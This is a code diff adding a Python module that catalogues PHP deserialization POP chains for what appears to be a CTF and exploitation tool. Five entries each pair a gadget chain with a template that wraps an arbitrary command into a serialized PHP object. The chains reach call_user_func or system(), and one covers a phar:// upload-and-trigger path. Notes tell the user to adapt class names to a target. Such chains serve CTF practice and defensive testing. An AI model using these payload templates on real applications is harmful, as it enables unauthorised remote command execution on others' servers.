@@ -1,0 +1,55 @@
+"""Generic / CTF-common POP chains (framework-agnostic)."""
+from . import POPChain
+
+GENERIC_CHAINS: list = [
+    POPChain(
+        name="generic_destruct_to_call",
+        framework="Generic",
+        gadget_classes=["Generic"],
+        entry_point="__destruct",
+        sink="call_user_func(callback)",
+        command_param="callback",
+        serialize_code=r"""b'O:1:"A":1:{s:1:"x";s:' + str(len(__command__)).encode() + b':"' + __command__.encode() + b'";}'""",
+        notes="Generic __destruct to call_user_func chain. Adjust class names based on the target's code.",
+    ),
+    POPChain(
+        name="generic_tostring_to_call",
+        framework="Generic",
+        gadget_classes=["Generic"],
+        entry_point="__toString",
+        sink="call_user_func(callback)",
+        command_param="callback",
+        serialize_code=r"""b'O:1:"B":1:{s:1:"y";s:' + str(len(__command__)).encode() + b':"' + __command__.encode() + b'";}'""",
+        notes="Generic __toString triggered via string concatenation/comparison.",
+    ),
+    POPChain(
+        name="newstar_ctf_pop",
+        framework="Generic",
+        gadget_classes=["Begin", "Then", "Super", "Handle", "CTF", "WhiteGod"],
+        entry_point="__destruct",
+        sink="system(var)",
+        command_param="var",
+        serialize_code=r"""b'O:5:"Begin":1:{s:4:"name";O:4:"Then":1:{s:10:"\x00Then\x00func";O:5:"Super":1:{s:6:"\x00*\x00obj";O:6:"Handle":1:{s:6:"\x00*\x00obj";O:3:"CTF":1:{s:6:"handle";O:8:"WhiteGod":2:{s:4:"func";s:6:"system";s:3:"var";s:' + str(len(__command__)).encode() + b':"' + __command__.encode() + b'";}}}}}}'""",
+        notes="NewStar CTF standard 6-class POP chain: Begin->Then->Super->Handle->CTF->WhiteGod->system().",
+    ),
+    POPChain(
+        name="generic_phar_deser",
+        framework="Generic",
+        gadget_classes=["Generic"],
+        entry_point="phar:// metadata",
+        sink="system(...)",
+        command_param="cmd",
+        serialize_code=r"""b'O:1:"C":1:{s:3:"cmd";s:' + str(len(__command__)).encode() + b':"' + __command__.encode() + b'";}'""",
+        notes="Generic phar:// deserialization. Upload .phar file, trigger with phar://path in file_exists/is_file/etc.",
+    ),
+    POPChain(
+        name="destruct_to_system",
+        framework="Generic",
+        gadget_classes=["Generic"],
+        entry_point="__destruct",
+        sink="system(cmd)",
+        command_param="cmd",
+        serialize_code=r"""b'O:1:"D":1:{s:3:"cmd";s:' + str(len(__command__)).encode() + b':"' + __command__.encode() + b'";}'""",
+        notes="Simple __destruct -> system() chain. Use when the target has a class whose destructor calls system/shell_exec.",
+    ),
+]
